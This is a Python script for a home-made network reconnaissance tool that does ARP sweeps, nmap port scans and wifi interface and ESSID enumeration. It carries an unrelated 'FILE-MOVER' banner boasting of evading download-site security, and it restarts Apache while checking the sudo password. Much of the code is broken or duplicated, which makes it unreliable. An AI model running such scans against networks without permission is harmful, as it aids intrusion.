## check interface information
# check AP's
# port scan or arp scan
# airmon
import subprocess, re, csv, os, time, shutil, sys, getpass, traceback, platform, time, threading, pprint
import pathlib, nmap
from datetime import datetime
from subprocess import Popen, call, PIPE
import IPCHECKER as IPx
from tqdm import tqdm
from getpass import getpass
import time
from time import ctime
import scapy.all as scapy
import nmap, re, traceback
from typing import Pattern, Match
import nmcli

from os import devnull

class Spinner:
    busy = False
    delay = 0.1

    @staticmethod
    def spinning_cursor():
        while 1:
            for cursor in '|/-\\': yield cursor

    def __init__(self, delay=None):
        self.spinner_generator = self.spinning_cursor()
        if delay and float(delay): self.delay = delay

    def spinner_task(self):
        while self.busy:
            sys.stdout.write(next(self.spinner_generator))
            sys.stdout.flush()
            time.sleep(self.delay)
            sys.stdout.write('\b')
            sys.stdout.flush()

    def __enter__(self):
        self.busy = True
        threading.Thread(target=self.spinner_task).start()

    def __exit__(self, exception, value, tb):
        self.busy = False
        time.sleep(self.delay)
        if exception is not None:
            return False


class Colors:
    reset = "\033[0m"

    # Black
    fgBlack = "\033[30m"
    fgBrightBlack = "\033[30;1m"
    bgBlack = "\033[40m"
    bgBrightBlack = "\033[40;1m"

    # Red
    fgRed = "\033[31m"
    fgBrightRed = "\033[31;1m"
    bgRed = "\033[41m"
    bgBrightRed = "\033[41;1m"

    # Green
    fgGreen = "\033[32m"
    fgBrightGreen = "\033[32;1m"
    bgGreen = "\033[42m"
    bgBrightGreen = "\033[42;1m"

    # Yellow
    fgYellow = "\033[33m"
    fgBrightYellow = "\033[33;1m"
    bgYellow = "\033[43m"
    bgBrightYellow = "\033[43;1m"

    # Blue
    fgBlue = "\033[34m"
    fgBrightBlue = "\033[34;1m"
    bgBlue = "\033[44m"
    bgBrightBlue = "\033[44;1m"
    # Magenta
    fgMagenta = "\033[35m"
    fgBrightMagenta = "\033[35;1m"
    bgMagenta = "\033[45m"
    bgBrightMagenta = "\033[45;1m"
    # Cyan
    fgCyan = "\033[36m"
    fgBrightCyan = "\033[36;1m"
    bgCyan = "\033[46m"
    bgBrightCyan = "\033[46;1m"
    # White
    fgWhite = "\033[37m"
    fgBrightWhite = "\033[37;1m"
    bgWhite = "\033[47m"
    bgBrightWhite = "\033[47;1m"


###########
color = Colors()
spinner = Spinner()
yellow = color.fgYellow
red = color.fgRed
blue = color.fgBlue
bblue = color.fgBrightBlue
cyan = color.fgCyan
bg_background = color.bgBlack
reset = color.reset


############


class Colors:
    reset = "\033[0m"

    # Black
    fgBlack = "\033[30m"
    fgBrightBlack = "\033[30;1m"
    bgBlack = "\033[40m"
    bgBrightBlack = "\033[40;1m"

    # Red
    fgRed = "\033[31m"
    fgBrightRed = "\033[31;1m"
    bgRed = "\033[41m"
    bgBrightRed = "\033[41;1m"

    # Green
    fgGreen = "\033[32m"
    fgBrightGreen = "\033[32;1m"
    bgGreen = "\033[42m"
    bgBrightGreen = "\033[42;1m"

    # Yellow
    fgYellow = "\033[33m"
    fgBrightYellow = "\033[33;1m"
    bgYellow = "\033[43m"
    bgBrightYellow = "\033[43;1m"

    # Blue
    fgBlue = "\033[34m"
    fgBrightBlue = "\033[34;1m"
    bgBlue = "\033[44m"
    bgBrightBlue = "\033[44;1m"
    # Magenta
    fgMagenta = "\033[35m"
    fgBrightMagenta = "\033[35;1m"
    bgMagenta = "\033[45m"
    bgBrightMagenta = "\033[45;1m"
    # Cyan
    fgCyan = "\033[36m"
    fgBrightCyan = "\033[36;1m"
    bgCyan = "\033[46m"
    bgBrightCyan = "\033[46;1m"
    # White
    fgWhite = "\033[37m"
    fgBrightWhite = "\033[37;1m"
    bgWhite = "\033[47m"
    bgBrightWhite = "\033[47;1m"


###########
color = Colors()
yellow = color.fgYellow
red = color.fgRed
blue = color.fgBlue
bblue = color.fgBrightBlue
cyan = color.fgCyan
bg_background = color.bgBlack
reset = color.reset

def display_header():
    # print('*' * 75)
    color_red = Colors()
    global red0
    red0 = color_red.fgRed
    global reset0
    reset0 = color_red.reset

    x = 'x'
    print(f"{'X' * 125:^70}")
    print(f"{'X' * 125:^70}")
    pretty = f'{red0}xxx FILE-MOVER xxx{reset0}'.center(width)
    print(f'{pretty : ^70}')
    print(f"{'X' * 125: ^70}")

    one = (
        f'[USAGE] - [1] This is a python program that takes a specified file names, and moves them into an individual folder.')
    two = (
        f'[USAGE] - [2] The program works well with most download repositories, and currently gets around security measure implimented by \n[USAGE] - [2]b 1337x.to, itorrent && archive.org')
    three = (
        f'[USAGE] - [3] Download a LINK GRABBING extension from chrome, to pull the URLs off of the browsers tabs.')
    four = (f'[USAGE] - [4] Save the list into download_list.txt (Found in the Directory as this program')
    five = (
        f'[USAGE] - [5] Wait for downloads. Archive.org may be slow. The program saves both a LIST and DICT for further usage. (see functions)')
    six = (f'[SYSTEM] copyright material from Adel Al-Aali [SYSTEM]')

    print(f"{one:^70}")
    print(f"{two:^70}")
    print(f"{three:^70}")
    print(f"{four:^70}")
    print(f"{five:^70}")
    print(f"{six:^70}")
    print(f"{x * 20: ^70}")
    print(), print()


def period_wait():
    period = ['.', '.', '.', '.', '.', '.', '.', '.', '.', '.']
    # multi = [2,2,2,2,2,2,2,2,2,2]
    period_len = len(period)
    with Spinner():
        for z, x in enumerate(period):
            print(x)
            time.sleep(.2)
            if z <= period_len:
                z += 1
                print(f"{yellow}{x * z}{reset}")
                continue
            elif z == period_len:
                break


def clear():
    # check and make call for specific operating system
    os_name = platform.system()
    _ = call('clear' if os_name == 'Linux' or 'Windows' or 'Darwin' else 'cls')




ACTIVE_NETWORKS = []
ACTIVE_LAN = []

import nmap, re, traceback
from typing import Pattern, Match


class ARPscan: ## arp scanner -
    def arp(self, ip):
        self.ip = ip
        print(ip)
        arp_r = scapy.ARP(pdst=ip)
        br = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        request = br / arp_r
        answered, unanswered = scapy.srp(request, timeout=1)
        answered00, unanswered00 = srp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=ip), timeout=1, iface='wlp1s0',
                                       inter=0.1)
        print('\tIP\t\t\t\t\tMAC')
        print('_' * 37)
        for i in answered:
            ip, mac = i[1].psrc, i[1].hwsrc
            print(ip, '\t\t' + mac)
            print('-' * 37)

        for i in answered00:
            ip, mac = i[1].psrc, i[1].hwsrc
            print(ip, '\t\t' + mac)
            print('-' * 37)

    def port_scan(self, ip_entered):
        ip_add_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
        port_range_pattern = re.compile(r"([0-9]+)-([0-9]+)")
        port_min = 0
        port_max = 65535
        open_ports = []
        # Ask user to input the ip address they want to scan.
        while True:
            print(f"**{yellow}**Enter the IP address for scanning  {reset}\n ")
            # sip_add_entered = ip_add_pattern.search(ip_add_entered)
            if ip_add_pattern:
                print(f"{ip_add_entered} is a valid ip address")
                break
        while True:
            print(f"**{yellow}**Enter the port range {reset}\n ")
            global port_range, master_results
            port_range = input("* ")
            port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
            print(type(port_range_valid))
            print(f'{yellow}The Ports Entered.. {reset}\n{port_range_valid}')
            # port_range_valid = str(port_range_valid)

            if port_range_valid:
                port_min = int(port_range_valid.group(1))
                port_max = int(port_range_valid.group(2))
                print(f'{yellow}[PORT-MIN]-- {reset}[{port_min}]\n{yellow}[PORT-MAX]{reset}{port_max}')
                break
        try:
            master_results = []
            print()
            print('X' * 50)
            print(f'{yellow}**Parsing First Run.{reset}')
            nm = nmap.PortScanner()
            ip_add_entered = str(ip_add_entered)
            host = ip_add_entered + '/24'
            nm.scan(hosts=host, arguments='-n -sP -PE -PA21,23,80,3389')
            hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
            for host, status in hosts_list:
                print(f'{yellow} :: [HOST-Status] {reset}')
                print(f"{host} :: {status}")
                nm.scan(ip_add_entered, port_range)

                for host in nm.all_hosts():
                    print('----------------------------------------------------')
                    print('Host : %s (%s)' % (host, nm[host].hostname()))
                    print('State : %s' % nm[host].state())
                    for proto in nm[host].all_protocols():
                        print('----------')
                        print('Protocol : %s' % proto)
                        lport = nm[host][proto].keys()
                        lport.sort()
                        for port in lport:
                            print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))

        except:
            print('Error in running all_host arg')

            # protocol
        try:

            protocols = nm[ip_add_entered].all_protocols()
            print(f'{yellow}**[STATUS]{reset}\n{protocols}')
            master_results.append(protocols)

        except Exception as EA:
            print(f'{red}Error In Parsing PROTOCOL{reset}')
            print(EA)

            ## PROTOCOL
            try:
                status = nm[ip_add_entered].state()
                print(f'{yellow}**[PROTOCOL]{reset}\n{status}')
                master_results.append(status)
            except:
                print(f'{red}Error In Parsing status{reset}')

            ### HAS TCP
            try:
                has_tcp = nm[ip_add_entered]['tcp'].keys()
                print(f'{yellow}**[PROTOCOL]{reset}\n{has_tcp}')
                master_results.append(has_tcp)

                port_22 = nm[ip_add_entered].has_tcp(22)
                print(f'{yellow}**[PORT-22]{reset}\n{port_22}')
                master_results.append(port_22)
                if port_22 is True:
                    info_22 = nm[ip_add_entered]['tcp'][22]
                    print(f'{yellow}**[{info_22}]')
                    master_results.append(info_22)
            except Exception as e:
                print(f'{red}ERROR IN TCP PARSE{reset}')
                print(e)

            ### HAS PORT 22

            ### HAS PORT 80
            try:
                port_80 = nm[ip_add_entered].has_tcp(80)
                print(f'{yellow}**[PORT-80]{reset}\n{port_80}')
                master_results.append(port_80)
                if port_80 is True:
                    info_80 = nm[ip_add_entered]['tcp'][80]
                    print(f'{yellow}**[{info_80}]')
                    master_results.append(info_80)

                ### HAS PORT 81
                port_81 = nm[ip_add_entered].has_tcp(81)
                print(f'{yellow}**[PORT-81]{reset}\n{port_81}')
                master_results.append(port_81)
                if port_81 is True:
                    info_81 = nm[ip_add_entered]['tcp'][81]
                    print(f'{yellow}**[{info_81}]')
                    master_results.append(info_81)

            except:
                print(f'{red}ERROR IN TCP PARSE{reset}')

        except KeyError as exkey:
            traceback.print_exc()
            print("[!] Cannot scan host!: ", exkey)

        for port in range(port_min, port_max + 1):
            try:
                print('X' * 50)
                # port_max += 1
                ip_add_entered = str(ip_add_entered)
                port = str(port)
                result = nm.scan(ip_add_entered, str(port))
                print(f'**{yellow}All Dictinary Keys:: {reset} \n{[*result.values()]}')  ## unpacks all dictinary keys
                print(result.keys())
                print('X' * 50)
                print(
                    f'{yellow}**[TARGET]-- {reset}[{ip_add_entered}]\n{yellow}*[PORT-MIN]{reset}{port_min} \n{yellow}*[PORT-MAX]{reset}{port_max}')
                print('X' * 50)

                print(f'{yellow}**[RESULTS]{reset}')
                print(result)
                # print([(k, result[timestr]) for k in result])
                # print(f'{yellow}**[CURRENT-PORT]{reset}\n{result["scaninfo"]}')
                print(f'{yellow}**[CURRENT-PORT]{reset}\n{port}')

                ## basic scan info
                basic_info = nm.scaninfo()
                print(f'{yellow}**[BASIC-INFO]{reset}\n{basic_info}')

                ### ALL HOSTS
                all_hosts = nm.all_hosts()
                print(f'{yellow}**[ALL-HOSTS]{reset}\n{all_hosts}')

                print(f'{yellow}**[ELAPSED-TIME]{reset}\n{port}')
                print('X' * 50)
                print(list(result.values()))
                master_results.append(result)

                try:
                    has_tcp = nm[ip_add_entered]['tcp'].keys()
                    print(f'{yellow}**[PROTOCOL]{reset}\n{has_tcp}')
                    master_results.append(has_tcp)

                    port_22 = nm[ip_add_entered].has_tcp(22)
                    print(f'{yellow}**[PORT-22]{reset}\n{port_22}')
                    master_results.append(port_22)
                    if port_22 is True:
                        info_22 = nm[ip_add_entered]['tcp'][22]
                        print(f'{yellow}**[{info_22}]')
                        master_results.append(info_22)
                except Exception as e:
                    print(f'{red}ERROR IN TCP PARSE{reset}')
                    print(e)

                    ### HAS PORT 22

                    ### HAS PORT 80
                try:
                    port_80 = nm[ip_add_entered].has_tcp(80)
                    print(f'{yellow}**[PORT-80]{reset}\n{port_80}')
                    master_results.append(port_80)
                    if port_80 is True:
                        info_80 = nm[ip_add_entered]['tcp'][80]
                        print(f'{yellow}**[{info_80}]')
                        master_results.append(info_80)

                    ### HAS PORT 81
                    port_81 = nm[ip_add_entered].has_tcp(81)
                    print(f'{yellow}**[PORT-81]{reset}\n{port_81}')
                    master_results.append(port_81)
                    if port_81 is True:
                        info_81 = nm[ip_add_entered]['tcp'][81]
                        print(f'{yellow}**[{info_81}]')
                        master_results.append(info_81)

                except:
                    print(f'{red}ERROR IN TCP PARSE{reset}')

                ### end of scan
                if port == port_max:
                    print(nm.csv())
                    return f'{red}**End of arp scan {master_results}'


            except Exception as e:
                traceback.print_exc()
                print(f"{red}**ERROR IN NMAP SCAN[{port}]{reset}.\n[{e}]")






#subprocess.run(["cat", "data.txt"], stdout=subprocess.DEVNULL,
 # stderr=subprocess.DEVNULL)


#args = shlex.split("sudo nmcli -f SSID,BSSID,DEVICE dev wifi")

import shlex
## nmcli check

class CheckInfo():
    def __init__(self):
        super(CheckInfo, self).__init__()
        self.nmcli = nmcli


    @staticmethod
    def install():
        try:
            sucessfull_install = []
            subprocess.check_call([sys.executable, "-m", "pip", "install", threading])
            if subprocess.check_call:
                print(f'{yellow} Sucessfully Installed PIP')
                sucessfull_install.append('pip')
            subprocess.check_call([sys.executable, "-m", "tqdm", "install", tqdm])
            if subprocess.check_call:
                print(f'{yellow} Sucessfully Installed TQDM')
                sucessfull_install.append('TQDM')
            subprocess.check_call([sys.executable, "-m", "pip", "datetime", datetime])
            if subprocess.check_call:
                print(f'{yellow} Sucessfully Installed datetime')
                sucessfull_install.append('datetime')
            subprocess.check_call([sys.executable, "-m", "pip", "net-tools", net - tools])
            if subprocess.check_call:
                print(f'{yellow} Sucessfully Installed datetime')
                sucessfull_install.append('net-tools')
            subprocess.check_call([sys.executable, "-m", "apt install", "airmon-ng", airmon - ng])
            if subprocess.check_call:
                print(f'{yellow} Sucessfully Installed airmon-ng')
                sucessfull_install.append('airmong-ng')
            print(f'{yellow}**Installed Dependencies {reset}\n{sucessfull_install}')

        except subprocess.CalledPssrocessError as sub0:
            traceback.print_exc()
            print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub0)}')
        except subprocess.TimeoutExpired as sub1:
            traceback.print_exc()
            print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub1)}')
        except subprocess.SubprocessError as sub2:
            traceback.print_exc()
            print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub2)}')

    @staticmethod
    def connect_vpn():
        print('X' * 50)
        subprocess.run("auto_vpn.sh")
        subprocess.run(["sudo", "expressvpn", "connect"],capture_output=True, text=True, check=True)
        print('X' * 50)


    def available_nics(self):
        try:
            print('X' * 50)
            print(f'{yellow} Available  NICS  {reset}')
            with open("NIC_INFO.txt", 'a') as f:
                output01 = subprocess.run(["sudo", "lsusb", "-f",], stdin=f,
                                        capture_output=True, text=True, check=True)
                print(output01).text

                output02 = subprocess.run(["sudo", "lshw", "-f", "-C", "network" "-short" ], stdin=f,
                                        capture_output=True, text=True, check=True)
                print(output02).text
                time.sleep(2)
                print('X' * 50)
                f.close()
            return output01, output02
        except subprocess.CalledPssrocessError as sub0:
            traceback.print_exc()
            print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub0)}')
        except subprocess.TimeoutExpired as sub1:
            traceback.print_exc()
            print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub1)}')
        except subprocess.SubprocessError as sub2:
            traceback.print_exc()
            print(f'{red} SUBPROCESS CALL ERROR {reset}\n{str(sub2)}')

    def interface_info(self):
        print(f'{yellow}**Checking NIC Info {reset}')
        with open("NIC_INFO.txt", 'a') as f:
            output = subprocess.run(["sudo", "nmcli", "-f", "SSID,BSSID,DEVICE", "dev", "wifi"], stdin=f,
                                    capture_output=True, text=True, check=True)
            print(output)
            f.close()


    def nic_status(self):
        time.sleep(2)
        print('X' * 50)

        print(f'{yellow} Checking General Status {reset}')
        with open("NIC_INFO.txt", 'a') as f:
            output = subprocess.run(["sudo", "nmcli", "-f", "general" "status"], stdin=f,
                                    capture_output=True, text=True, check=True)
            print(output)
            f.close()
        #output full tree to .XML / do not read to terminal
        subprocess.run(["sudo", "lshw", "-f", "-C", "network" "-xml"]) #  capture_output=True, text=True, check=True)
        time.sleep(2)
        print('X' * 50)


    def check_usbStatus(self):
        time.sleep(2)
        print('X' * 50)
        print(f'{yellow}**Checking Radio Status {reset}')
        with open("NIC_INFO.txt", 'a') as f:
            output01 = subprocess.run(["sudo","lsusb"], stdin=f, capture_output=True, text=True, check=True)
            print(output01)
            output02 = subprocess.run(["sudo","lspci"], stdin=f, capture_output=True, text=True, check=True)
            print(output02)
            f.close()
            time.sleep(2)
            print('X' * 50)

    def radio_status(self):
        time.sleep(2)
        print('X' * 50)
        print(f'{yellow}**Checking Radio Status {reset}')
        with open("NIC_INFO.txt", 'a') as f:
            output = subprocess.run(["sudo", "nmcli", "-f", "radio", "all"], stdin=f, capture_output=True, text=True, check=True)
            print(output)
            f.close()
        time.sleep(2)
        print('X' * 50)

    def get_nic_permissions(self):
        time.sleep(2)
        print('X' * 50)
        print(f'{yellow} Reading NIC PERMISSIONS {reset}')
        with open("NIC_INFO.txt", 'a') as f:
            output = subprocess.run(["sudo", "nmcli", "-f", "general", "permissions"], stdin=f, capture_output=True, text=True, check=True)
            print(output)
            f.close()
        time.sleep(2)
        print('X' * 50)

    def find_signals(self):
        print('X' * 50)
        print(f'{yellow}  Listening for  current  ESSID/AP Status {reset}')
        print(f'{yellow} Finding A Signal {reset}')
        time.sleep(7)
        print('X' * 50)
        with open("AVAIL_SIGNALS.txt", 'a') as f:
            print('X' * 50)
            output01 = subprocess.Popen(["sudo", "iwlist", "wlan0", "scan", "grep" "ESSID"], stdin=f, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f'{yellow} List of available networks {reset}')
            print(output01)
            time.sleep(2)
            print('X' * 50)

            output02 = subprocess.Popen(["sudo", "iwlist", "en0", "scan", "grep" "ESSID"], stdin=f, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f'{yellow} List of available networks {reset}')
            print(output02)
            time.sleep(2)
            print('X' * 50)

            output03 = subprocess.Popen(["sudo", "iwlist", "en0", "scan", "grep" "ESSID"], stdin=f, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(2)
            print('X' * 50)
            print(f'{yellow} List of available networks {reset}')
            print(output03)
            time.sleep(2)
            print('X' * 50)
            f.close()
    @staticmethod
    def lame_netstat():
        time.sleep(2)
        print('X' * 50)
        print(f'{yellow} Reading NETSTAT on all ports {reset}')
        with open("NIC_INFO.txt", 'a') as f:
            output = subprocess.run(["sudo", "netstat", "-f", "-a", "-l"], stdin=f, capture_output=True, text=True, check=True)
            print(output)
            f.close()
        time.sleep(2), print()
        print('X' * 50)
        print(f'{yellow} Reading NETSTAT on all ports {reset}')
        short_output = subprocess.run(["sudo", "netstat", "-f", "-a", "-l"], stdin=f, capture_output=True, text=True, check=True)
        print(short_output)




def arp_scan():
    ip_add_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    port_range_pattern = re.compile(r"([0-9]+)-([0-9]+)")
    port_min = 0
    port_max = 65535
    open_ports = []
    # Ask user to input the ip address they want to scan.
    while True:
        print(f"**{yellow}**Enter the IP address for scanning  {reset}\n ")
        ip_add_entered = input('** ')
        # sip_add_entered = ip_add_pattern.search(ip_add_entered)
        if ip_add_pattern:
            print(f"{ip_add_entered} is a valid ip address")
            break
        else:
            break
    while True:
        print(f"**{yellow}**Enter the port range {reset}\n ")
        global port_range, master_results
        port_range = input("* ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ", ""))
        print(type(port_range_valid))
        print(f'{yellow}The Ports Entered.. {reset}\n{port_range_valid}')
        # port_range_valid = str(port_range_valid)

        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            print(f'{yellow}[PORT-MIN]-- {reset}[{port_min}]\n{yellow}[PORT-MAX]{reset}{port_max}')
            break

    try:
        master_results = []
        print()
        print('X' * 50)
        print(f'{yellow}**Parsing First Run.{reset}')
        nm = nmap.PortScanner()
        ip_add_entered = str(ip_add_entered)
        host = ip_add_entered + '/24'
        nm.scan(hosts=host, arguments='-n -sP -PE -PA21,23,80,3389')
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
        for host, status in hosts_list:
            print(f'{yellow} :: [HOST-Status] {reset}')
            print(f"{host} :: {status}")
            nm.scan(ip_add_entered, port_range)

            for host in nm.all_hosts():
                print('----------------------------------------------------')
                print('Host : %s (%s)' % (host, nm[host].hostname()))
                print('State : %s' % nm[host].state())
                for proto in nm[host].all_protocols():
                    print('----------')
                    print('Protocol : %s' % proto)
                    lport = nm[host][proto].keys()
                    lport.sort()
                    for port in lport:
                        print('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))

    except:
        print('Error in running all_host arg')

        # protocol
    try:
        protocols = nm[ip_add_entered].all_protocols()

        print(f'{yellow}**[STATUS]{reset}\n{protocols}')
        master_results.append(protocols)

    except Exception as EA:
        print(f'{red}Error In Parsing PROTOCOL{reset}')
        print(EA)

        ## PROTOCOL
        try:
            status = nm[ip_add_entered].state()
            print(f'{yellow}**[PROTOCOL]{reset}\n{status}')
            master_results.append(status)
        except:
            print(f'{red}Error In Parsing status{reset}')

        ### HAS TCP
        try:
            has_tcp = nm[ip_add_entered]['tcp'].keys()
            print(f'{yellow}**[PROTOCOL]{reset}\n{has_tcp}')
            master_results.append(has_tcp)

            port_22 = nm[ip_add_entered].has_tcp(22)
            print(f'{yellow}**[PORT-22]{reset}\n{port_22}')
            master_results.append(port_22)
            if port_22 is True:
                info_22 = nm[ip_add_entered]['tcp'][22]
                print(f'{yellow}**[{info_22}]')
                master_results.append(info_22)
        except Exception as e:
            print(f'{red}ERROR IN TCP PARSE{reset}')
            print(e)

        ### HAS PORT 22

        ### HAS PORT 80
        try:
            port_80 = nm[ip_add_entered].has_tcp(80)
            print(f'{yellow}**[PORT-80]{reset}\n{port_80}')
            master_results.append(port_80)
            if port_80 is True:
                info_80 = nm[ip_add_entered]['tcp'][80]
                print(f'{yellow}**[{info_80}]')
                master_results.append(info_80)

            ### HAS PORT 81
            port_81 = nm[ip_add_entered].has_tcp(81)
            print(f'{yellow}**[PORT-81]{reset}\n{port_81}')
            master_results.append(port_81)
            if port_81 is True:
                info_81 = nm[ip_add_entered]['tcp'][81]
                print(f'{yellow}**[{info_81}]')
                master_results.append(info_81)

        except:
            print(f'{red}ERROR IN TCP PARSE{reset}')

    except KeyError as exkey:
        traceback.print_exc()
        print("[!] Cannot scan host!: ", exkey)

    for port in range(port_min, port_max + 1):
        try:
            print('X' * 50)
            # port_max += 1
            ip_add_entered = str(ip_add_entered)
            port = str(port)
            result = nm.scan(ip_add_entered, str(port))
            print(f'**{yellow}All Dictinary Keys:: {reset} \n{[*result.values()]}')  ## unpacks all dictinary keys
            print(result.keys())
            print('X' * 50)
            print(
                f'{yellow}**[TARGET]-- {reset}[{ip_add_entered}]\n{yellow}*[PORT-MIN]{reset}{port_min} \n{yellow}*[PORT-MAX]{reset}{port_max}')
            print('X' * 50)

            print(f'{yellow}**[RESULTS]{reset}')
            print(result)
            # print([(k, result[timestr]) for k in result])
            # print(f'{yellow}**[CURRENT-PORT]{reset}\n{result["scaninfo"]}')
            print(f'{yellow}**[CURRENT-PORT]{reset}\n{port}')

            ## basic scan info
            basic_info = nm.scaninfo()
            print(f'{yellow}**[BASIC-INFO]{reset}\n{basic_info}')

            ### ALL HOSTS
            all_hosts = nm.all_hosts()
            print(f'{yellow}**[ALL-HOSTS]{reset}\n{all_hosts}')

            print(f'{yellow}**[ELAPSED-TIME]{reset}\n{port}')
            print('X' * 50)
            print(list(result.values()))
            master_results.append(result)

            try:
                has_tcp = nm[ip_add_entered]['tcp'].keys()
                print(f'{yellow}**[PROTOCOL]{reset}\n{has_tcp}')
                master_results.append(has_tcp)

                port_22 = nm[ip_add_entered].has_tcp(22)
                print(f'{yellow}**[PORT-22]{reset}\n{port_22}')
                master_results.append(port_22)
                if port_22 is True:
                    info_22 = nm[ip_add_entered]['tcp'][22]
                    print(f'{yellow}**[{info_22}]')
                    master_results.append(info_22)
            except Exception as e:
                print(f'{red}ERROR IN TCP PARSE{reset}')
                print(e)

                ### HAS PORT 22

                ### HAS PORT 80
            try:
                port_80 = nm[ip_add_entered].has_tcp(80)
                print(f'{yellow}**[PORT-80]{reset}\n{port_80}')
                master_results.append(port_80)
                if port_80 is True:
                    info_80 = nm[ip_add_entered]['tcp'][80]
                    print(f'{yellow}**[{info_80}]')
                    master_results.append(info_80)

                ### HAS PORT 81
                port_81 = nm[ip_add_entered].has_tcp(81)
                print(f'{yellow}**[PORT-81]{reset}\n{port_81}')
                master_results.append(port_81)
                if port_81 is True:
                    info_81 = nm[ip_add_entered]['tcp'][81]
                    print(f'{yellow}**[{info_81}]')
                    master_results.append(info_81)

            except:
                print(f'{red}ERROR IN TCP PARSE{reset}')

            ### end of scan
            if port == port_max:
                print(nm.csv())
                return f'{red}**End of arp scan {master_results}'


        except Exception as e:
            traceback.print_exc()
            print(f"{red}**ERROR IN NMAP SCAN[{port}]{reset}.\n[{e}]")



# TO AVOID SSID DUPLICATIONS- #pass ssid % list
def check_wifi(ssid, list):
    check = True
    for item in list:
        if len(list) == 0:
            print(f'{yellow}**[PARSING] {item}')
            return check
        elif ssid in item['essid']:
            print(f'{yellow} ESSID FOUND')
            check_status = False
            return check
        return check


try:
    print(IPx.get_ip)
    # print(f'\033[;35;47m \t\t[{IPx.get_ip()}]  ...? \033[0m 0;35;47m')
    width = os.get_terminal_size().columns  # set the width to center goods
    terminal = os.environ.get('TERM')
    width_len = width
    cwd = os.getcwd()
    #  IP_INFO = f"\033[1;35;0m {IPx.IP}"
    IP = IPx.get_ip

    current_version = platform.release()
    system_info = platform.platform()
    os_name0 = platform.system()

    ## new adds
    big_names = platform.uname()
    processor = platform.processor()
    architecture = platform.architecture()
    user_id = os.uname()
    login = os.getlogin()

    display_header()
    print(), print()
    print('X' * 150)
    print('X' * 150)
    print()
    print(f'SYSTEM INFO'.center(width))  ### IP_INFO Is disabled due to .API usage limit.
    print(f'\033[1;35;m [{current_version}]  ...? '.center(width))
    print(f'\033[1;35;m [{os_name0}] + [{terminal}] ...? '.center(width))
    print(f'\033[1;35;m [{system_info}]  ...? '.center(width))
    print(f'\033[1;35;0m [{current_version}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{IP}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{big_names}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{processor}]  ...? '.center(width))  ### ADDD YOUR IP
    print(f'\033[1;35;0m [{architecture}]  ...? '.center(width))  ###
    print(f'\033[1;35;0m [{user_id}]  ...? '.center(width))  ###
    print(f'\033[1;35;0m [{login}]  ...? '.center(width))  ###
    print(f'\033[1;35;0m [{current_version}]  ...? '.center(width))  ### ADDD YOUR IP
    # print(f'\033[1;35;0m [{IP_INFO}]  ...? '.center(width))  ### ADDD YOUR IP

except Exception as E:
    traceback.print_exc()
    print(str(E))

current_platform = platform.system()
platform_name = sys.platform
while True:
    print(f'{yellow}[CHECKING OS]{reset}')
    if 'Darwin' in current_platform:
        print(f'{red} Your OS [{current_platform}] || [{platform_name}] \n* You may run into a few issues-**{reset}')
        period_wait()
        clear()
        break
    elif 'Windows' in current_platform:
        print(f'{red} Your OS [{current_platform}] || [{platform_name}] sucks. \n**FUCK-WINDOWS-**{reset}')
        period_wait()
        clear()
        break
    elif 'Linux' in current_platform or 'Ubuntu' in current_platform or 'Kali' in current_platform:
        print(f'[DETECTED LINUX]')
        print(f'{yellow}**Your OS [{current_platform}] || Platform [{platform_name}]')
        period_wait()
        clear()
        break





try:  ## (try, except else)
    with Spinner():
        flag = True
        while flag:
            if not 'SUDO_UID' in os.environ.keys():
                print('x' * 50)
                print('[SYSTEM] Must have SU Privledges.')
                password = getpass('* ')
                print()
                proc = Popen('sudo -S apache2ctl restart'.split(), stdin=PIPE, stderr=PIPE)
                proc.communicate(password.encode())
                print(proc.communicate)
                if proc.communicate:
                    print(f'**{yellow}Sudo Escalation Successful, moving on.. {reset}')
                    flag = False
                    break
                else:
                    print(f'**{red}Sudo Escalation failed, SYS.EXIT on.. {reset}')
                    print(f'**{yellow}Try again... {reset}')
                    continue
except Exception as EX:
    print(f'{red}IO ERROR - MUST BE SUPER USER()): {reset}  \n**{EX}')
    sys.exit(1)
else:
    print('X' * 50)
    try:  ## try, else except
        info = CheckInfo()
        global AVAILABLE_NICS
        AVAILABLE_NICS = []
        #nic00 = interface_all.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
        current_time = time.time()
        clock_time = time.ctime(current_time)
        print(f'{yellow}**Your OS {current_platform} || Platform {platform_name}  \n{clock_time}')
        print(f'{yellow}[ALL-INTERFACES] {reset}')
        print(f'{bblue}{info.available_nics}{bblue}')
        nic = input('**')

        if f'Ubuntu'.lower() in platform_name or f'Ubuntu'.lower() in current_platform:
            print(f'{yellow}**Detected Linux, auto compliling IW-CONFIG. {reset}')
            interface_UBUNTU = re.compile(r"^wlo[0-9]")  ##### UBUNTU
            nic = interface_UBUNTU.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())
            AVAILABLE_NICS.append(nic)
            print(f'Choose The NIC for use: ')
            nic = input('')

        else:
            print('X' * 50)
            print(f'{yellow}**Your OS [{current_platform}] || Platform [{platform_name}]  \n[{clock_time}]')
            print(f'{yellow}*Your NIC {reset}\n[{nic}]')
            nic = str(nic)
            nic = nic.replace("[", "")
            nic = nic.replace("]", "")
            nic = nic.replace("'", "")
